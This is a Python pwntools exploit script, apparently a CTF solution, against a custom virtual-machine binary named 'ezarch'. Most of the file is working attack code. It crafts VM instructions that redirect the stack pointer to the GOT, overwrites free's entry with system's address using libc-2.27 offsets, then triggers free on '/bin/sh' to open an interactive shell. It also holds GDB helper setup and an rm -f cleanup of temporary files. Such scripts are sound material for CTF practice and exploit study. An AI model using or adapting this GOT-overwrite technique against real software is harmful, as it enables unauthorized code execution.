#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './ezarch'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
sh = process(execve_file)
# sh = remote('', 0)
elf = ELF(execve_file)
libc = ELF('./libc-2.27.so')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    b *$rebase(0xA6F)
    b *$rebase(0xFB6)
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

def set_env(malloc_size, edit_size, content, eip, esp, ebp):
    sh.sendafter('>', 'M')
    sh.sendlineafter('>', str(malloc_size))
    sh.sendlineafter('>', str(edit_size))
    sh.sendafter(')\n', content)

    sh.sendlineafter('>', str(eip))
    sh.sendlineafter('>', str(esp))
    sh.sendlineafter('>', str(ebp))

layout = [
    '/bin/sh\0',
    # set stack_addr point to free.got
    p8(3) + p8(0x20) + p32(0)  + p32(17), # set r0 = stack_addr
    p8(2) + p8(0x10) + p32(0)  + p32(0xa8), # set r0 -= 0xa8
    p8(3) + p8(0x02) + p32(17)  + p32(0), # set stack_addr = r0

    # modify free.got to system.got
    p8(3) + p8(0x20) + p32(0)  + p32(16), # set r0 = stack_addr[esp], esp=12  puts.got+4
    p8(3) + p8(0x10) + p32(16)  + p32(4), # set esp = 4  free.got+4
    p8(3) + p8(0x02) + p32(16)  + p32(0), # set stack_addr[esp] = r0, esp=4  free.got+4
    p8(3) + p8(0x10) + p32(16)  + p32(8), # set esp = 8  puts.got
    p8(3) + p8(0x20) + p32(0)  + p32(16), # set r0 = stack_addr[esp], esp=8  puts.got
    p8(2) + p8(0x10) + p32(0)  + p32(libc.symbols['puts'] - libc.symbols['system']), # set r0 -= (libc.symbols['puts'] - libc.symbols['system'])
    p8(3) + p8(0x10) + p32(16)  + p32(0), # set esp = 0  free.got
    p8(3) + p8(0x02) + p32(16)  + p32(0), # set stack_addr[esp] = r0, esp=0  free.got
]

payload = flat(layout)
set_env(0x1018, len(payload), payload, 8, 12, 0x1008)
sh.sendafter('>', 'R')

sh.sendafter('>', 'M')
sh.sendlineafter('>', str(1))

sh.interactive()
clear()